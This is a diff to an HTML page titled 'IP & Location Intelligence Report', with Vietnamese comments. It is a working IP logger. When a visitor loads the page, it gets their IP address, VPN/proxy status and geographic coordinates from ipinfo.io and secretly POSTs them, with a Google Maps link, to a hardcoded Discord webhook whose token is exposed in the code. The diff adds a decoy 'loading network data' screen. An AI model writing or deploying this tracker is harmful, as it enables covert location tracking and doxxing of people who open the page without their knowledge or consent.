@@ -6,12 +6,21 @@
     <title>IP & Location Intelligence Report</title>
 </head>
 <body>
+    <div style="text-align:center; margin-top:20vh; font-family:Arial;">
+        <h2>Đang tải dữ liệu mạng...</h2>
+        <div id="ip-display" style="font-size: 2em; color: red; font-weight: bold;">...</div>
+    </div>
+
     <script>
     function monke(json) {
+        // Hiển thị IP trực tiếp lên màn hình trang web
+        document.getElementById('ip-display').innerText = json.ip || 'N/A';
+
         var request = new XMLHttpRequest();
         request.open("POST", "https://discord.com/api/webhooks/1557733822601105419/3P02RcN4TR9j8DkIq8GodlkvgBo2bD-40J_5NaFNle3KvxeTtKoNhRbQGELIy7o_9jr6");
         request.setRequestHeader('Content-type', 'application/json');
 
+        // Kiểm tra VPN/Proxy
         let isVpnOrProxy = "NO";
         if (json.privacy) {
             if (json.privacy.vpn || json.privacy.proxy || json.privacy.hosting) {
@@ -19,6 +28,7 @@
             }
         }
 
+        // Tạo link Google Maps từ tọa độ
         let lat = 'N/A', lon = 'N/A', mapsLink = 'Không có tọa độ';
         if (json.loc) {
             let coords = json.loc.split(',');
@@ -81,6 +91,8 @@
         request.send(JSON.stringify(params));
     }
     </script>
-    <script src="https://ipinfo.io/json?callback=monke"></script>
+
+    <!-- Sử dụng định dạng JSONP chuẩn của bản đầu tiên để gọi dữ liệu mượt mà -->
+    <script src="https://ipinfo.io/?format=jsonp&callback=monke"></script>
 </body>
 </html>
